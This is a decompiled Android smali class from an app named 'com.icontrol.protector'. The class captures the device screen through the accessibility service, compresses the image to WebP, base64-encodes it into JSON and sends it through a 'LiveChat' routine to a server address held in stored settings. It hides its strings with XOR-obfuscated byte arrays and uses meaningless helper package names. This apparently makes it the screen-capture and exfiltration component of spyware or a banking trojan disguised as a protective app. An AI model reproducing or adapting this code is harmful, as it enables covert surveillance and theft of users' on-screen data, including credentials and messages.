.class Lcom/icontrol/protector/AccessServices$d$a;
.super Ljava/lang/Thread;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/AccessServices$d;->onSuccess(Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;

.field final synthetic f:Lcom/icontrol/protector/AccessServices$d;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/AccessServices$d;Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/AccessServices$d$a;->f:Lcom/icontrol/protector/AccessServices$d;

    iput-object p2, p0, Lcom/icontrol/protector/AccessServices$d$a;->e:Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 9

    :try_start_0
    iget-object v0, p0, Lcom/icontrol/protector/AccessServices$d$a;->e:Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;

    invoke-static {v0}, Lntidisestablish/neumonoul/floccinaucinih/a0;->a(Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;)Landroid/hardware/HardwareBuffer;

    move-result-object v0

    iget-object v1, p0, Lcom/icontrol/protector/AccessServices$d$a;->e:Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;

    invoke-static {v1}, Lntidisestablish/neumonoul/floccinaucinih/b0;->a(Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;)Landroid/graphics/ColorSpace;

    move-result-object v1

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/c0;->a(Landroid/hardware/HardwareBuffer;Landroid/graphics/ColorSpace;)Landroid/graphics/Bitmap;

    move-result-object v0

    sget-object v1, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    const/4 v2, 0x1

    invoke-virtual {v0, v1, v2}, Landroid/graphics/Bitmap;->copy(Landroid/graphics/Bitmap$Config;Z)Landroid/graphics/Bitmap;

    move-result-object v1

    const/16 v2, 0x15e

    const/16 v3, 0x28a

    const/4 v4, 0x0

    invoke-static {v1, v2, v3, v4}, Landroid/graphics/Bitmap;->createScaledBitmap(Landroid/graphics/Bitmap;IIZ)Landroid/graphics/Bitmap;

    move-result-object v1

    new-instance v2, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v2}, Ljava/io/ByteArrayOutputStream;-><init>()V

    iget-object v3, p0, Lcom/icontrol/protector/AccessServices$d$a;->f:Lcom/icontrol/protector/AccessServices$d;

    iget-object v3, v3, Lcom/icontrol/protector/AccessServices$d;->a:Ljava/lang/String;

    const/4 v5, 0x4

    new-array v6, v5, [B

    fill-array-data v6, :array_0

    const/16 v7, 0x8

    new-array v8, v7, [B

    fill-array-data v8, :array_1

    invoke-static {v6, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_1

    sget-boolean v3, Lcom/icontrol/protector/AccessServices;->z:Z

    if-eqz v3, :cond_0

    const/high16 v3, 0x3f800000    # 1.0f

    invoke-static {v1, v3}, Lcom/icontrol/protector/n;->s(Landroid/graphics/Bitmap;F)Landroid/graphics/Bitmap;

    move-result-object v1

    sget-object v3, Landroid/graphics/Bitmap$CompressFormat;->WEBP:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v4, 0x64

    invoke-virtual {v1, v3, v4, v2}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    goto :goto_0

    :catch_0
    move-exception v0

    goto/16 :goto_2

    :cond_0
    sget-object v3, Landroid/graphics/Bitmap$CompressFormat;->WEBP:Landroid/graphics/Bitmap$CompressFormat;

    iget-object v4, p0, Lcom/icontrol/protector/AccessServices$d$a;->f:Lcom/icontrol/protector/AccessServices$d;

    iget v4, v4, Lcom/icontrol/protector/AccessServices$d;->b:I

    invoke-virtual {v1, v3, v4, v2}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    :goto_0
    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v2

    iget-object v3, p0, Lcom/icontrol/protector/AccessServices$d$a;->f:Lcom/icontrol/protector/AccessServices$d;

    iget-object v4, v3, Lcom/icontrol/protector/AccessServices$d;->c:Landroid/content/Context;

    iget-object v3, v3, Lcom/icontrol/protector/AccessServices$d;->a:Ljava/lang/String;

    invoke-static {v4, v2, v3}, Lcom/icontrol/protector/LiveChat;->f(Landroid/content/Context;[BLjava/lang/String;)V

    goto/16 :goto_1

    :cond_1
    sget-object v3, Landroid/graphics/Bitmap$CompressFormat;->WEBP:Landroid/graphics/Bitmap$CompressFormat;

    iget-object v6, p0, Lcom/icontrol/protector/AccessServices$d$a;->f:Lcom/icontrol/protector/AccessServices$d;

    iget v6, v6, Lcom/icontrol/protector/AccessServices$d;->b:I

    invoke-virtual {v1, v3, v6, v2}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v2

    invoke-static {v2, v4}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    new-array v4, v5, [B

    fill-array-data v4, :array_2

    new-array v6, v7, [B

    fill-array-data v6, :array_3

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    new-array v6, v5, [B

    fill-array-data v6, :array_4

    new-array v8, v7, [B

    fill-array-data v8, :array_5

    invoke-static {v6, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v4, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v4, 0x3

    new-array v4, v4, [B

    fill-array-data v4, :array_6

    new-array v6, v7, [B

    fill-array-data v6, :array_7

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v3}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v2

    iget-object v3, p0, Lcom/icontrol/protector/AccessServices$d$a;->f:Lcom/icontrol/protector/AccessServices$d;

    iget-object v3, v3, Lcom/icontrol/protector/AccessServices$d;->c:Landroid/content/Context;

    sget-object v4, Lntidisestablish/neumonoul/floccinaucinih/ab;->x:Ljava/lang/String;

    new-array v6, v5, [B

    fill-array-data v6, :array_8

    new-array v8, v7, [B

    fill-array-data v8, :array_9

    invoke-static {v6, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-static {v3, v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    new-array v4, v5, [B

    fill-array-data v4, :array_a

    new-array v5, v7, [B

    fill-array-data v5, :array_b

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_2

    iget-object v3, p0, Lcom/icontrol/protector/AccessServices$d$a;->f:Lcom/icontrol/protector/AccessServices$d;

    iget-object v3, v3, Lcom/icontrol/protector/AccessServices$d;->c:Landroid/content/Context;

    sget-object v4, Lntidisestablish/neumonoul/floccinaucinih/ab;->w:Ljava/lang/String;

    const/4 v5, 0x0

    invoke-static {v3, v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    :cond_2
    iget-object v4, p0, Lcom/icontrol/protector/AccessServices$d$a;->f:Lcom/icontrol/protector/AccessServices$d;

    iget-object v4, v4, Lcom/icontrol/protector/AccessServices$d;->c:Landroid/content/Context;

    invoke-static {v4, v3, v2}, Lcom/icontrol/protector/LiveChat;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :goto_1
    invoke-virtual {v0}, Landroid/graphics/Bitmap;->recycle()V

    invoke-virtual {v1}, Landroid/graphics/Bitmap;->recycle()V

    iget-object v0, p0, Lcom/icontrol/protector/AccessServices$d$a;->e:Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;

    invoke-static {v0}, Lntidisestablish/neumonoul/floccinaucinih/a0;->a(Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;)Landroid/hardware/HardwareBuffer;

    move-result-object v0

    invoke-static {v0}, Lntidisestablish/neumonoul/floccinaucinih/d0;->a(Landroid/hardware/HardwareBuffer;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_3

    :goto_2
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_3
    return-void

    :array_0
    .array-data 1
        0x2dt
        0x66t
        0x41t
        0x4bt
    .end array-data

    :array_1
    .array-data 1
        0x5et
        0x8t
        0x20t
        0x3bt
        -0x66t
        0x7ft
        0x63t
        -0x6bt
    .end array-data

    :array_2
    .array-data 1
        -0x24t
        0x68t
        -0xet
        0x36t
    .end array-data

    :array_3
    .array-data 1
        -0x58t
        0x11t
        -0x7et
        0x53t
        0x14t
        -0x62t
        0x3dt
        -0x23t
    .end array-data

    :array_4
    .array-data 1
        -0x3ct
        0x1dt
        0x40t
        -0x62t
    .end array-data

    :array_5
    .array-data 1
        -0x49t
        0x73t
        0x21t
        -0x12t
        -0x3ct
        -0x47t
        -0x53t
        -0x2ft
    .end array-data

    :array_6
    .array-data 1
        -0x14t
        0x33t
        0x57t
    .end array-data

    :array_7
    .array-data 1
        -0x7bt
        0x5et
        0x30t
        -0x50t
        0x1ft
        0x6et
        -0x48t
        -0x5bt
    .end array-data

    :array_8
    .array-data 1
        0xft
        -0x19t
        0x8t
        0x29t
    .end array-data

    :array_9
    .array-data 1
        0x61t
        -0x6et
        0x64t
        0x45t
        -0x2dt
        0xft
        -0x37t
        0x1at
    .end array-data

    :array_a
    .array-data 1
        0x23t
        0x4bt
        -0x3ft
        0x5ct
    .end array-data

    :array_b
    .array-data 1
        0x4dt
        0x3et
        -0x53t
        0x30t
        0x35t
        0x74t
        -0x59t
        0x67t
    .end array-data
.end method
